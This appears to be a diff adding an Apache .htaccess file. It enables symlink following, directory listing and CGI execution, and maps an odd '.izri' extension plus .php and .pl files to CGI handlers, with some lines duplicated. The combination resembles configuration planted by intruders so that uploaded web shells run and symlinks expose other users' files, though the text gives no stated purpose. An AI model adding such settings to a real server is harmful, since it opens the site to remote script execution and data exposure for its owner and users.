@@ -1,0 +1,8 @@
+Options FollowSymLinks MultiViews Indexes ExecCGI
+
+AddType application/x-httpd-cgi .izri .php
+
+AddHandler cgi-script .pl
+AddHandler cgi-script .pl
+AddHandler cgi-script .php
+AddHandler cgi-script .php
